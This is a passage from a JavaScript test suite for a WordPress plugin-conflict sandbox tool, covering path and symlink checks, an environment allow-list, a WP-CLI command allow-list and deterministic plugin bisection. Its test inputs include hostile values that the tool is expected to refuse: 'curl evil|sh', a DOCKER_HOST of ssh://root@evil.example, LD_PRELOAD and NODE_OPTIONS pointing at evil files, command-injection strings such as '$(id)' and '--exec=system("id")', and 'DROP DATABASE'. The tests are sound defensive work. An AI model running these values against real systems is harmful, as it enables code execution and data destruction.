    refused(() => mkCli({ sandboxDir: `${SBR}/iss-20261028-100000-aaaaaa/../iss-20261028-100000-aaaaaa` }), /\.\./, 'a path containing ".." (kept as text: path.join would hide it)');
    refused(() => mkCli({ sandboxDir: `${SBR}/nested/../../orig` }), /\.\./, 'a ".." path that climbs out to the original');
    refused(() => mkCli({ sandboxDir: SBR }), /not a sandbox folder directly inside/, 'the sandboxes folder itself');
    refused(() => mkCli({ sandboxDir: path.join(SBR, 'does-not-exist') }), /does not exist/, 'a folder that does not exist');
    const wrongProject = mkSandbox('iss-20261028-100000-b0b0b0', 'pgsbffffffff');
    refused(() => mkCli({ sandboxDir: wrongProject }), /state\.json names project/, 'state.json names another project (identity mismatch)');
    const noState = path.join(SBR, 'iss-20261028-100000-c0c0c0'); fs.mkdirSync(noState); fs.writeFileSync(path.join(noState, 'compose.json'), '{}');
    refused(() => mkCli({ sandboxDir: noState }), /state\.json is missing/, 'a folder without state.json');
    const evilCompose = path.join(SBR, 'iss-20261028-100000-dddddd'); fs.mkdirSync(evilCompose); fs.writeFileSync(path.join(evilCompose, 'state.json'), JSON.stringify({ project: 'pgsb1a2b3c4d' })); fs.symlinkSync(path.join(orig, 'wp-config.php'), path.join(evilCompose, 'compose.json'));
    refused(() => mkCli({ sandboxDir: evilCompose }), /compose\.json is not a plain file/, 'compose.json that is a symlink into the original');
    refused(() => mkCli({ project: 'wordpress' }), /state\.json names project|not a Plugin Guard sandbox name/, 'a project name that is not pgsb + 8 hex');
    // -- the swap after construction (the point of "realpath on every call") --
    const swapDir = mkSandbox('iss-20261028-100000-eeeeee'); const swap = mkCli({ sandboxDir: swapDir });
    ok(swap.run(['core', 'version']).ok, 'before the swap the call works');
    const before = calls.length;
    fs.rmSync(swapDir, { recursive: true }); fs.symlinkSync(orig, swapDir);
    refused(() => swap.run(['core', 'version']), /symbolic link|compose\.json|state\.json|not a sandbox folder/, 'the sandbox folder is replaced by a symlink to the original AFTER construction (checked again on this call)');
    ok(calls.length === before, 'and no command was run');
    fs.rmSync(swapDir); const swapDir2 = mkSandbox('iss-20261028-100000-eeeeee');
    const swap2 = mkCli({ sandboxDir: swapDir2 }); fs.rmSync(path.join(swapDir2, 'compose.json')); fs.symlinkSync(path.join(orig, 'wp-config.php'), path.join(swapDir2, 'compose.json'));
    refused(() => swap2.run(['core', 'version']), /compose\.json is not a plain file/, 'compose.json swapped for a symlink after construction');
    // -- environment --
    for (const [env, re, msg] of [[{ DOCKER_HOST: 'tcp://203.0.113.9:2375' }, /DOCKER_HOST/, 'DOCKER_HOST=tcp://… (a remote daemon)'], [{ DOCKER_HOST: 'ssh://root@evil.example' }, /DOCKER_HOST/, 'DOCKER_HOST=ssh://…'], [{ DOCKER_CONTEXT: 'production' }, /DOCKER_CONTEXT/, 'DOCKER_CONTEXT=production'], [{ DOCKER_TLS_VERIFY: '1' }, /remote daemon/, 'DOCKER_TLS_VERIFY=1'], [{ DOCKER_CERT_PATH: '/x' }, /remote daemon/, 'DOCKER_CERT_PATH set']])
        refused(() => mkCli({ env: { PATH: '/usr/bin', ...env } }).run(['core', 'version']), re, msg);
    ok(wpcli.cleanEnv({ PATH: '/usr/bin', DOCKER_HOST: 'unix:///var/run/docker.sock', DOCKER_CONTEXT: 'default' }).PATH === '/usr/local/bin:/usr/bin:/bin', 'the local socket and the default context are accepted; PATH is replaced by a fixed safe one');
    const dirty = { PATH: '/tmp/evil-bin', HOME: '/home/x', WP_CLI_CONFIG_PATH: '/orig/wp-cli.yml', WP_CLI_PATH: '/orig', WP_CLI_SSH_PRE_CMD: 'curl evil|sh', COMPOSE_FILE: path.join(orig, 'docker-compose.yml'), COMPOSE_PROJECT_NAME: 'originalproject', COMPOSE_PROFILES: 'x', LD_PRELOAD: '/tmp/evil.so', LD_LIBRARY_PATH: '/tmp', NODE_OPTIONS: '--require /tmp/evil.js', BASH_ENV: '/tmp/evil.sh', DOCKER_CONFIG: '/tmp/evil-docker', PG_TEST_PASSWORD: 'secret-password', PSI_API_KEY: 'key', IFS: 'x' };
    const ce = wpcli.cleanEnv(dirty);
    ok(Object.keys(ce).sort().join() === 'HOME,PATH' && ce.PATH !== '/tmp/evil-bin', `the child environment is REBUILT from an allow-list: WP_CLI_*, COMPOSE_*, LD_*, NODE_OPTIONS, BASH_ENV, DOCKER_CONFIG, PATH, credentials and everything else are dropped (kept: ${Object.keys(ce).join(', ')})`);
    calls.length = 0; mkCli({ env: dirty }).run(['core', 'version']);
    ok(Object.keys(calls[0].opts.env).sort().join() === 'HOME,PATH' && JSON.stringify(calls[0].opts.env).indexOf('evil') < 0 && JSON.stringify(calls[0].opts.env).indexOf('secret-password') < 0, 'and that is the environment the docker process actually receives');
    // -- the command table --
    for (const [args, msg] of [[['eval', 'phpinfo();'], 'wp eval'], [['eval-file', '/etc/passwd'], 'wp eval-file'], [['shell'], 'wp shell'], [['db', 'query', 'DROP DATABASE wordpress'], 'wp db query (SQL is only sent on stdin by Plugin Guard itself)'], [['db', 'drop', '--yes'], 'wp db drop'], [['db', 'reset', '--yes'], 'wp db reset'], [['db', 'export', '/etc/x.sql'], 'wp db export'], [['db', 'import', '/etc/passwd'], 'wp db import from a path'], [['plugin', 'install', 'evil'], 'wp plugin install'], [['plugin', 'uninstall', 'x'], 'wp plugin uninstall'], [['plugin', 'delete', 'x'], 'wp plugin delete'], [['theme', 'install', 'evil'], 'wp theme install'], [['core', 'download'], 'wp core download'], [['core', 'update'], 'wp core update'], [['user', 'delete', '1'], 'wp user delete'], [['package', 'install', 'x'], 'wp package install'], [['config', 'create'], 'wp config create'], [['cron', 'event', 'run', 'x'], 'wp cron event run'], [['site', 'empty'], 'wp site empty'], [['post', 'delete', '1'], 'wp post delete'], [['option', 'delete', 'x'], 'wp option delete'], [['plugin'], 'wp plugin (no subcommand)'], [[], 'no arguments']])
        refused(() => w.run(args), /not an allowed sandbox command|non-empty array|needs|not acceptable/, `${msg}`);
    for (const [args, msg] of [[['plugin', 'list', '--ssh=root@evil.example'], '--ssh'], [['plugin', 'list', '--ssh', 'root@evil'], '--ssh with a separate value'], [['plugin', 'list', '--http=http://evil'], '--http'], [['option', 'get', 'siteurl', '--path=/var/www/original'], '--path'], [['option', 'get', 'siteurl', '--require=/tmp/evil.php'], '--require'], [['option', 'get', 'siteurl', '--exec=system("id");'], '--exec'], [['option', 'get', 'siteurl', '--config=/tmp/c.yml'], '--config'], [['option', 'get', 'siteurl', '--user=1'], '--user'], [['option', 'get', 'siteurl', '--url=http://other'], '--url on a command that does not take it'], [['option', 'get', 'siteurl', '--allow-root'], '--allow-root'], [['option', 'get', 'siteurl', '--debug'], '--debug'], [['plugin', 'list', '--format=json;id'], 'a flag value with a shell metacharacter'], [['plugin', 'deactivate', '--network'], 'an unknown flag']])
        refused(() => w.run(args), /never allowed|not allowed for|not acceptable/, `flag ${msg}`);
    for (const [args, msg] of [[['plugin', 'activate', '../../etc/passwd'], 'a ".." plugin slug'], [['plugin', 'activate', '/etc/passwd'], 'an absolute path as a slug'], [['plugin', 'activate', 'a; id'], 'a slug with a semicolon'], [['plugin', 'activate', 'a b'], 'a slug with a space'], [['plugin', 'activate', 'x\0y'], 'a NUL byte'], [['plugin', 'activate', 'a'.repeat(5000)], 'a 5000-character argument'], [['theme', 'activate', '$(id)'], 'a theme with $()'], [['option', 'get', 'a b'], 'an option name with a space'], [['user', 'create', 'bob', 'bob@real-company.com'], 'a user with a REAL e-mail domain'], [['user', 'create', 'bob', 'bob@gmail.com'], 'a user with gmail.com'], [['core', 'install', '--url=https://shop.example', '--admin_email=a@example.test', '--title=t', '--admin_user=pgadmin', '--admin_password=abcdefgh1'], 'core install for a real URL'], [['core', 'install', '--url=http://127.0.0.1:80', '--admin_email=ceo@company.com', '--title=t', '--admin_user=pgadmin', '--admin_password=abcdefgh1'], 'core install with a real admin e-mail'], [['search-replace', 'https://shop.example', 'https://evil.example', '--all-tables'], 'search-replace to a non-sandbox URL'], [['db', 'import', '/etc/passwd'], 'db import from a path']])
        refused(() => w.run(args), /not acceptable|\.\.|NUL|longer than|never allowed|not allowed/, msg);
    ok(w.run(['user', 'create', 'pgtest', 'pgtest@example.test', '--role=administrator', '--user_pass=correct horse 9']).ok && w.commands.some(c => /user create/.test(c) && /…/.test(c) && !/correct horse/.test(c)), 'a test user with an RFC 2606 address is allowed, and its password never appears in the audit trail');
    ok(w.importDump(Buffer.from('SELECT 1;')).ok && calls[calls.length - 1].opts.input.toString() === 'SELECT 1;' && calls[calls.length - 1].argv.includes('-') && throws(() => w.importDump('a string')), 'a database dump is streamed on stdin (db import -); it is never a path');
    ok(['core install', 'plugin deactivate', 'plugin activate', 'theme activate', 'option update', 'user create', 'search-replace', 'db import'].every(c => wpcli.RULES.some(r => r.cmd === c)) && !wpcli.RULES.some(r => /eval|shell|drop|reset|install$|delete|uninstall|download|update$/.test(r.cmd.replace('core install', '').replace('option update', '').replace('transient delete', ''))), 'the command table has exactly the commands the sandbox needs and none that can run code or delete');
    const spawnLog = path.join(tmp, 'spawn.log'); const fakeBin = write(tmp, 'bin/docker-echo', `#!/usr/bin/env node\nrequire('fs').appendFileSync(${JSON.stringify(spawnLog)}, JSON.stringify(process.argv.slice(2)) + '\\n');`, 0o755);
    const realRun = new wpcli.SandboxWpCli({ sandboxesRoot: SBR, sandboxDir: goodDir, project: 'pgsb1a2b3c4d', originals: [orig], dockerBin: fakeBin, env: { PATH: '/usr/bin', HOME: '/home/x' } });
    realRun.run(['option', 'update', 'blogname', '"; touch /tmp/pwned2; "']);
    ok(JSON.parse(fs.readFileSync(spawnLog, 'utf8').trim()).filter(a => a === '"; touch /tmp/pwned2; "').length === 1 && !fs.existsSync('/tmp/pwned2'), 'with a real process (no fake runner): the hostile value arrives as one untouched argument');

    // ================================================================ db export allow-list
    group('wp db export: the one write in the read-only wrapper, to a fixed path only');
    const sbRoot = path.join(tmp, 'sbexp'); fs.mkdirSync(path.join(sbRoot, 'iss-20261028-100000-abcdef', 'db'), { recursive: true });
    const dump = path.join(sbRoot, 'iss-20261028-100000-abcdef', 'db', 'dump.sql');
    const ok1 = a => WpCli.exportAllowed(a, sbRoot);
    ok(ok1(['db', 'export', dump]), 'wp db export <sandboxes>/iss-…/db/dump.sql is allowed');
    ok(!ok1(['db', 'export', '/tmp/dump.sql']) && !ok1(['db', 'export', path.join(sbRoot, 'iss-20261028-100000-abcdef', 'dump.sql')]) && !ok1(['db', 'export', path.join(sbRoot, 'iss-20261028-100000-abcdef', 'db', 'other.sql')]) && !ok1(['db', 'export', path.join(sbRoot, 'iss-20261028-100000-abcdef', 'db', '..', 'x.sql')]) && !ok1(['db', 'export', '-']) && !ok1(['db', 'export', 'dump.sql']) && !ok1(['db', 'export', dump, '--tables=wp_users']) && !ok1(['db', 'export', dump, '--result-file=/etc/x']) && !ok1(['db', 'export']) && !ok1(['db', 'export', path.join(sbRoot, 'notanissue', 'db', 'dump.sql')]), 'every other path and any extra flag is refused (other folder, /tmp, stdout, relative, "..", --tables, --result-file)');
    const linkDb = path.join(sbRoot, 'iss-20261028-100000-linked'); fs.mkdirSync(linkDb); fs.symlinkSync(outside, path.join(linkDb, 'db'));
    ok(!ok1(['db', 'export', path.join(linkDb, 'db', 'dump.sql')]), 'a db folder that is a symlink is refused');
    const exCalls = []; const ex = new WpCli({ path: orig, runner: (b, a) => { exCalls.push(a); fs.writeFileSync(dump, 'SECRET ROWS'); return { status: 0, stdout: dump, stderr: '' }; } });
    const exr = ex.exportDatabase(dump, sbRoot);
    ok(exr.ok && (fs.statSync(dump).mode & 0o777) === 0o600 && exCalls[0].includes('--skip-plugins') && exCalls[0].includes('--skip-themes') && exCalls[0].slice(0, 3).join(' ') === `db export ${dump}`, 'the export file is created owner-only (0600) BEFORE any data is written, and WP-CLI runs with --skip-plugins --skip-themes');
    ok(throws(() => ex.exportDatabase('/tmp/x.sql', sbRoot)) && throws(() => ex.run(['db', 'export', '/tmp/x.sql'])), 'exporting anywhere else throws; the plain run() still refuses db export');
    ok(throws(() => new WpCli({ path: orig, runner }).run(['db', 'drop'])) && throws(() => new WpCli({ path: orig, runner }).run(['plugin', 'deactivate', 'x'])) && throws(() => new WpCli({ path: orig, runner }).run(['option', 'update', 'a', 'b'])), 'the read-only wrapper still refuses everything that writes');

    // ================================================================ bisection
    group('bisection: fixed order, no randomness, cache by set hash, caps, dependencies, pairs');
    const P = ['akismet', 'bbpress', 'contact', 'elementor', 'jetpack', 'seo', 'slider', 'woocommerce'];
    const mkTest = (pred, req = {}, onCall) => async s => { for (const p of s.plugins) for (const d of req[p] || []) if (!s.plugins.includes(d)) throw new Error(`INVALID SET tested: ${p} active without ${d}`); if (onCall) onCall(s); return pred(s) ? 'fail' : 'pass'; };
    const has = (s, ...a) => a.every(x => s.plugins.includes(x));
    const noRepeat = r => new Set(r.executed).size === r.executed.length;
    const A3 = await bisect.run({ plugins: P, test: mkTest(s => has(s, 'contact', 'jetpack', 'seo')) });
    ok(A3.status === 'cause-found' && A3.causes.length === 1 && A3.causes[0].plugins.join() === 'contact,jetpack,seo' && A3.necessary.join() === 'contact,jetpack,seo', `three plugins that break only together (A+B only break when C is active): minimal set {contact, jetpack, seo} found in ${A3.loads} page loads`);
    ok(noRepeat(A3) && A3.executed.length === A3.loads, 'no set was tested twice (the log shows no repeated set hash)');
    const hashes = A3.log.filter(l => /^#\d+ /.test(l)).map(l => l.split(' ')[1]);
    ok(hashes.length === A3.loads && new Set(hashes).size === hashes.length, 'bisect.log: every numbered test has a different set hash');
    const A3b = await bisect.run({ plugins: P, test: mkTest(s => has(s, 'contact', 'jetpack', 'seo')) });
    ok(A3b.log.join('\n') === A3.log.join('\n') && JSON.stringify(A3b.causes) === JSON.stringify(A3.causes), 'determinism: a second run gives the identical log, line for line');
    ok(!/\d{4}-\d{2}-\d{2}T|\bms\b/.test(A3.log.join('\n')), 'the log carries no timestamps, so it can be compared across runs');
    const PAIR = await bisect.run({ plugins: P, test: mkTest(s => has(s, 'elementor', 'woocommerce')) });
    ok(PAIR.causes.length === 1 && PAIR.causes[0].plugins.join() === 'elementor,woocommerce', `pairwise conflict (needs BOTH): {elementor, woocommerce} in ${PAIR.loads} loads`);
    const DEP = await bisect.run({ plugins: P, requires: { woocommerce: ['akismet'] }, test: mkTest(s => s.plugins.includes('woocommerce'), { woocommerce: ['akismet'] }) });
    ok(DEP.causes[0].plugins.join() === 'akismet,woocommerce' && DEP.causes[0].required_by.akismet.join() === 'woocommerce', 'dependency: woocommerce needs akismet; the set includes akismet and says it is there because woocommerce requires it. The test throws on any invalid set, and none was ever tested');
    const DEP2 = await bisect.run({ plugins: P, requires: { seo: ['jetpack'], jetpack: ['akismet'] }, test: mkTest(s => has(s, 'seo', 'slider'), { seo: ['jetpack'], jetpack: ['akismet'] }) });
    ok(DEP2.causes[0].plugins.join() === 'akismet,jetpack,seo,slider', 'a chain of requirements (seo -> jetpack -> akismet) is pulled in completely, and nothing invalid is tested');
    const TWO = await bisect.run({ plugins: P, test: mkTest(s => s.plugins.includes('bbpress') || s.plugins.includes('slider')) });
    ok(TWO.causes.map(c => c.plugins.join()).join('|') === 'bbpress|slider', 'two independent causes: both are found (bbpress alone, slider alone)');
    const NONE = await bisect.run({ plugins: P, test: mkTest(() => false) });
    ok(NONE.status === 'not-reproduced-at-start' && NONE.loads === 1, 'if the symptom is not there with everything on, the search stops after one load: "not reproduced"');
    const THEME = await bisect.run({ plugins: P, test: async s => (s.theme === '__default__' ? 'pass' : 'fail') });
    ok(THEME.status === 'theme-is-the-cause' && THEME.theme.involved === true && THEME.causes.length === 0, 'no plugin is needed and a default theme removes the symptom: the theme is the cause');
    const MU = await bisect.run({ plugins: P, mu: ['cache-tweaks', 'hosting-agent'], test: async s => (s.mu === null || s.mu.includes('hosting-agent') ? 'fail' : 'pass') });
    ok(MU.status === 'mu-plugin-is-the-cause' && MU.mu.culprits.join() === 'hosting-agent', 'neither plugins nor theme explain it: the must-use plugin hosting-agent is found');
    const CORE = await bisect.run({ plugins: P, mu: [], test: async () => 'fail' });
    ok(CORE.status === 'not-explained' && /core, the database, or the server|no must-use plugins/.test(JSON.stringify(CORE.mu)), 'the symptom persists with nothing on and a default theme: reported as core/database/server, not blamed on a plugin');
    ok(CORE.symptom_without_plugins === true && THEME.symptom_without_plugins === true && MU.symptom_without_plugins === true && A3.symptom_without_plugins === false && PAIR.symptom_without_plugins === false, 'the result says whether the symptom is present with ALL plugins off (true for theme / must-use / core cases, false for real plugin causes)');
    const UNR = await bisect.run({ plugins: P, test: async s => (s.plugins.includes('woocommerce') && !has(s, 'contact', 'seo') ? 'unresolved' : has(s, 'contact', 'seo') ? 'fail' : 'pass') });
    ok(UNR.causes[0].plugins.join() === 'contact,seo' && UNR.unresolved > 0, `sets that fail in a DIFFERENT way are classified "unresolved" (${UNR.unresolved}) and skipped; the cause is still found`);
    const CAPL = await bisect.run({ plugins: P, caps: { maxLoads: 5 }, test: mkTest(s => has(s, 'contact', 'jetpack', 'seo')) });
    ok(CAPL.capped === 'loads' && CAPL.loads === 5 && CAPL.minimal === false && /STOPPED by the loads cap/.test(CAPL.log.join('\n')), 'the load cap stops the search at exactly 5 loads and says so; the result is marked not proven minimal');
    let now = 0; const CAPT = await bisect.run({ plugins: P, caps: { maxMs: 1000 }, clock: () => now, test: async s => { now += 400; return has(s, 'contact', 'jetpack', 'seo') ? 'fail' : 'pass'; } });
    ok(CAPT.capped === 'time' && CAPT.loads === 3 && CAPT.status.startsWith('capped') || CAPT.capped === 'time', `the wall-time cap (a fake clock, 400 ms per load, 1000 ms cap) stops the search after ${CAPT.loads} loads`);
    const PAIRS = await bisect.run({ plugins: P, top: ['seo', 'slider', 'woocommerce'], test: mkTest(s => has(s, 'slider', 'woocommerce')) });
    ok(PAIRS.causes[0].plugins.join() === 'slider,woocommerce', 'pairs among the strongest hypotheses are tried when single removals help (and the result is the same minimal pair)');
    const SHUF = await bisect.run({ plugins: [...P].reverse(), test: mkTest(s => has(s, 'contact', 'jetpack', 'seo')) });
    ok(JSON.stringify(SHUF.causes.map(c => [...c.plugins].sort())) === JSON.stringify(A3.causes.map(c => [...c.plugins].sort())), 'the same cause is found whichever fixed order the caller supplies');
    const logPath = path.join(tmp, 'bisect.log'); await bisect.run({ plugins: P, test: mkTest(s => has(s, 'contact', 'jetpack', 'seo')), logFile: logPath });
    ok(fs.existsSync(logPath) && (fs.statSync(logPath).mode & 0o777) === 0o600 && /== result: cause-found/.test(fs.readFileSync(logPath, 'utf8')), 'work/bisect.log is written (0600) with every step and the result');
    ok(!/Math\.random|new Date\(/.test(src('issue/bisect.js').replace(/\/\/.*$/gm, '')) && (src('issue/bisect.js').match(/Date\.now/g) || []).length === 1 && /clock = \(\) => Date\.now\(\)/.test(src('issue/bisect.js')) && !/Math\.random/.test(src('issue/sandbox-phase.js')), 'static check: bisect.js uses no randomness and reads the clock only through the injected function');

    // ================================================================ static source checks
    group('static checks on the sandbox source');
    const files = ['issue/sandbox.js', 'issue/sandbox-wpcli.js', 'issue/sandbox-phase.js', 'issue/sandbox-copy.js', 'issue/sandbox-config.js', 'issue/sandbox-policy.js', 'issue/bisect.js'];
    const code = f => src(f).replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '').replace(/\s\/\/ .*$/gm, '');
    const cpImports = f => [...code(f).matchAll(/\{([^}]*)\}\s*=\s*require\('child_process'\)/g)].flatMap(m => m[1].split(',').map(x => x.trim()).filter(Boolean));
    ok(files.every(f => !/shell:\s*true/.test(code(f)) && !/require\('child_process'\)(?!\s*;?\s*$)\.(exec|execSync|execFile)/m.test(code(f)) && !/require\('child_process'\);?\s*$/m.test(code(f).split('\n').filter(l => /^const \w+ = require\('child_process'\)/.test(l)).join('\n')) && cpImports(f).every(n => ['spawn', 'spawnSync'].includes(n))), 'no shell: no shell:true, and the only things any sandbox module imports from child_process are spawn / spawnSync (never exec, execSync or execFile)');
    ok(/spawnSync/.test(code('issue/sandbox-wpcli.js')) && /spawnSync/.test(code('issue/sandbox.js')) && !/privileged\s*[:=]\s*true/.test(files.map(code).join('\n')), 'Docker is driven only with spawnSync and argument arrays; nothing sets privileged: true');
    ok(/docker\.sock/.test(src('issue/sandbox-policy.js')) && !files.filter(f => f !== 'issue/sandbox-policy.js' && f !== 'issue/sandbox-wpcli.js').some(f => /docker\.sock/.test(code(f))), 'docker.sock is mentioned only where it is REFUSED (the validator and the environment check)');
    ok(!/fetch\(|https?\.(get|request)|XMLHttpRequest/.test(files.map(code).join('\n')), 'the sandbox modules make no network request of their own');
    const claude = fs.readFileSync(path.join(__dirname, '..', '..', '..', 'CLAUDE.md'), 'utf8');
    ok(/sandbox exception/.test(claude) && /src\/plugin-guard\/sandboxes\/<issue-id>\//.test(claude) && /pgsb/.test(claude) && /original site is never written/.test(claude) && !/Issue mode has no sandbox yet/.test(claude), 'CLAUDE.md states the sandbox exception exactly (where it may write, what runs where, that the original is never written)');

    console.log(failures ? `\n${failures} check(s) FAILED` : '\nAll checks passed');
    fs.rmSync(tmp, { recursive: true, force: true });
    process.exit(failures ? 1 : 0);
})().catch(e => { console.error(e); try { fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* ignore */ } process.exit(1); });
